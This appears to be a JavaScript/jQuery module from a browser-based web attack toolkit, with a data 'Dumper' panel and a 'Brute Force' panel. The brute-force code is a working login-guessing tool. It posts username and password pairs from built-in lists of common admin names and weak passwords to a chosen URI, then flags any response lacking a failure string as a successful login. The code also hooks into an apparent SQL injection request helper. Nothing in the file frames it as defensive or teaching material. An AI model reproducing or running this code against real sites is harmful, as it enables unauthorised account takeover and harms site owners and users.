$("#datadumper").html("<div style='width:100%;' id='dumper' class='explore'><div id='head'>Dumper</div><div style='height: 320px;' id='body'><textarea style='width: 98%; height: 300px;' id='dumpdata'></textarea></div><div id='foot' class='explore' style='width:99%;'><div id='dumpgetdatabtn' class='button'>Get data</div><div id='dumpsetdatabtn' class='button'>Set data</div></div></div>");
$("#dumpgetdatabtn").live("click",function(){
	$("#dumper #dumpdata").val($("#dblist #body").html());
});
$("#dumpsetdatabtn").live("click",function(){
	$("#dblist #body").html($("#dumper #dumpdata").val());
});
/*****************************************************
brute force
******************************************************/
$("#bruteforce").html("<div style='width:100%;' id='bruteforcemain' class='explore'><div id='head'>Brute Force</div><div style='height: auto;' id='body'><div id='bruteforceuser' class='explore' style='width: 25%'><div id='head'>User</div><div style='height: auto;' id='body'><textarea style='height: 255px; width: 90%;' id='user'></textarea></div><div id='foot' class='explore' style='width:99%;'><div class='button'>User Arg</div><input type='text' id='userarg' style='width: 190px; margin: 6px; float: left;' value='username'></div></div><div id='bruteforcepass' class='explore' style='width: 25%'><div id='head'>Pass</div><div style='height: auto;' id='body'><textarea style='height: 255px; width: 90%;' id='pass'></textarea></div><div id='foot' class='explore' style='width:99%;'><div class='button'>Pass Arg</div><input type='text' id='passarg' value='password' style='width: 190px; margin: 6px; float: left;'></div></div><div id='bruteforceavail' class='explore' style='width: 50%'><div id='head'>Available</div><div style='height: 150px;' id='body'></div></div><div id='bruteforcelog' class='explore' style='width: auto; float: none; height: auto;'><div id='head'>Log</div><div style='height: auto;' id='body'><textarea style='height: 470px; width: 95%;' id='log'></textarea></div></div></div><div id='foot' class='explore' style='width:99%;'><div style='margin: 6px; float: left;'>URI:<input type='text' value='' id='bruteforceuri'></div><div style='margin: 6px; float: left;'>Other argument:<input type='text' value='' id='bruteforcearg'></div><div style='margin: 6px; float: left;'>False string<input type='text' value='' id='bruteforcefalse'></div><div style='margin: 6px; float: left;'>Sleep:<input type='text' id='bruteforcesleep' value='2' style='width: 20px;'></div><div id='bruteforcebtn' class='button'>Scan</div></div></div>");
//-----------------------------------------------
var BruteUserList = "admin,administrator,test,demo".split(',');
var BrutePassList = "123pass,pass123,admin,admincp,administrator,matkhau,passadmin,password,p@ssw0rd,123456,1234567,12345678,123456789,1234567890,111111,000000,222222,333333,444444,555555,666666,777777,888888,999999,123123,234234,345345,456456,567567,678678,789789,123321,456654,654321,7654321,87654321,987654321,0987654321,admin123,123admin,admin123456,123456admin,1234554321,12344321,abcdef,abcabc,!@#!@#,!@#$%^,!@#$%^&*(,!@#$$#@!,abc123,qwerty,anhyeuem,iloveyou,test,demo".split(',');
//-----------------------------------------------
var BRUTE = {
userarg: "",
passarg: "",
userlist: $("#bruteforceuser #user"),
passlist: $("#bruteforcepass #pass"),
log: $("#bruteforcelog #log"),
avail: $("#bruteforceavail #body"),
arg: "",
falsestring:"",
pause:{}
};
//---------------------------------------
function BruteForceGlobal(){
	BRUTE.log.val("");
	BRUTE.avail.val("");
	BRUTE.userarg = $.trim($("#bruteforcemain #userarg").val());
	BRUTE.passarg = $.trim($("#bruteforcemain #passarg").val());
	BRUTE.arg = $.trim($("#bruteforcearg").val());
	BRUTE.falsestring = $.trim($("#bruteforcefalse").val());
	URL[2] = $.trim($("#bruteforceuri").val());
	VTM.sleep = parseInt($.trim($("#bruteforcesleep").val()));
}
function BruteForceShowLog(type,user,pass){
	if(type){
		var log = "[+] Success:   "+user+"\t:\t"+pass+"\n";
		BRUTE.log.val(BRUTE.log.val()+log);
		BRUTE.avail.append("<div class='active'>"+user+" : "+pass+"</div>");
	}else{
		BRUTE.log.val(BRUTE.log.val()+"[-] Error:   "+user+"\t:\t"+pass+"\n");
	}
	BRUTE.log.scrollTop(99999);
}
function BruteForceMain(userid,passid){
	if($.trim($("#bruteforcebtn").html()) == "Continue" || $.trim(URL[2]) == ""|| typeof URL[2] == "undefined") {
		BRUTE.pause[0] = userid;
		BRUTE.pause[1] = passid;
		return;
	}
	if(typeof BruteUserList[userid] == 'undefined') return;
	var tag = (passid + 1 < BrutePassList.length)? true:false;
	BruteForce(BruteUserList[userid],BrutePassList[passid],[BruteForceMain,[tag?userid:userid+1,tag?passid+1:0]]);
}
function BruteForce(user,pass,callback){
	var data = $.trim(BRUTE.arg +"&"+ BRUTE.userarg +"="+ user +"&"+ BRUTE.passarg +"="+pass);
	SQLIAjax(data,
		function(xhr){
			var num = xhr.responseText.split(BRUTE.falsestring).length;
			if(num > 1){
				BruteForceShowLog(0,user,pass);
			}else{
				BruteForceShowLog(1,user,pass);
			}
			CallBacker(callback[0],callback[1]);
		},VTM.sleep,'post'
	);
}
//============================
for(i=0; i <BruteUserList.length; i++){
	BRUTE.userlist.val(BRUTE.userlist.val()+ BruteUserList[i] +"\n");
}

for(i=0; i <BrutePassList.length; i++){
	BRUTE.passlist.val(BRUTE.passlist.val()+ BrutePassList[i] +"\n");
}
delete BruteUserList;
delete BrutePassList;
/********************************
hook
********************************/
$("#bruteforcebtn").live("click",function(){
	if($(this).html() == 'Pause'){
		$(this).html("Continue");
	}else if($(this).html() == 'Continue'){
		$(this).html("Pause");
		BruteForceMain(BRUTE.pause[0],BRUTE.pause[1]);
	}else{
		BruteForceGlobal();
		$(this).html("Pause");
		BruteUserList = $.trim(BRUTE.userlist.val()).split("\n");
		BrutePassList = $.trim(BRUTE.passlist.val()).split("\n");
		BruteForceMain(0,0);
	}
});

});
